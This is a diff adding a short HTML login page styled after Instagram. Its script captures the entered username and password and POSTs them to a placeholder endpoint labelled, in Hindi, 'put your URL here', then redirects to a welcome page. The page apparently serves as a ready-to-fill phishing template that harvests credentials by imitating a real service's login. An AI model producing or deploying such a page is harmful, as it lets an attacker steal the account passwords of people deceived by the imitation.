@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Login</title>
+  </head>
+  <body>
+    <h2>Instagram Style Login</h2>
+    <form id="loginForm">
+      <input type="text" id="username" placeholder="Username" required><br><br>
+      <input type="password" id="password" placeholder="Password" required><br><br>
+      <button type="submit">Login</button>
+    </form>
+
+    <script>
+      document.getElementById("loginForm").addEventListener("submit", function(e){
+        e.preventDefault();
+        fetch("**YAHAN_APNA_URL_LAGAO**", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            username: document.getElementById("username").value,
+            password: document.getElementById("password").value
+          })
+        }).then(res => {
+          if(res.ok){
+            window.location.href = "welcome.html"; // Optional: Welcome page
+          }
+        });
+      });
+    </script>
+  </body>
+</html>
